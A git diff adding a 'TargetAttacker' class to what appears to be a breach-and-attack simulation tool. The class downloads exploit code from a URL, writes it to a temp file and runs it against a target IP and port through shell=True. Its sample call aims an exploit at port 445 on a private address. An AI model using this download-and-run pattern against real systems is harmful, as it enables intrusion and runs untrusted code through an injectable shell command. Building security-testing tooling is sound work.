@@ -14,6 +14,8 @@ logging.config.dictConfig(config)
 logger = logging.getLogger(__name__)
 
 from processor import Processor
+import requests
+import subprocess
 
 """
 {
@@ -25,16 +27,57 @@ from processor import Processor
 }
 """
 class TargetAttacker(Processor):
-    fields = []
+    fields = ["download", "target_ip", "target_port", "usage"]
+    signature = b"BAScope"
+
     def __init__(self, cmd, id):
         super().__init__(cmd, id)
         self.check_cmd(self.fields)
+        self.path = str(parent) + "/tmp/ex.py"
+        logger.debug(f"[target] file: {self.path}")
+        return
 
-    def run_cmd(self):
-        pass
+    def run_cmd(self, debug):
+        self.debug = debug
+        target_ip = self.cmd["target_ip"]
+        self.link = self.cmd['download']  # 공격 코드 다운로드 링크
+        target_port = self.cmd['target_port']
+
+        if self.debug:
+            pass
+        else:
+            # 다운로드 받은 공격코드를 임시 디렉토리에 저장함
+            r = requests.get(self.link)
+            with open(self.path, "w") as f:
+                f.write(r.text)
+
+        replacements = [
+            ("<FILE>", self.path),
+            ("<IP>", target_ip),
+            ("<PORT>", str(target_port))
+        ]
+        usage = self.cmd_after_replacement(self.cmd['usage'], replacements)
+
+        subprocess.call(usage, shell=True)
+
+        return
 
     def report(self):
         url = self.base_url + self.report_url
-        data = {
+        data = {}
 
-        }
+        # attack target 모드에서는 무엇을 보고해야할까?
+        return
+
+if __name__ == '__main__':
+    msg = {
+        "type": "attack_secu",
+        "download": f"http://localhost:9000/exploit/1",
+        "target_ip": "172.30.1.26",
+        "target_port": 445,
+        "usage": "python <FILE> <IP>",
+    }
+
+    a = TargetAttacker(msg, 1)
+    a.run_cmd(debug = True)
+    a.report()
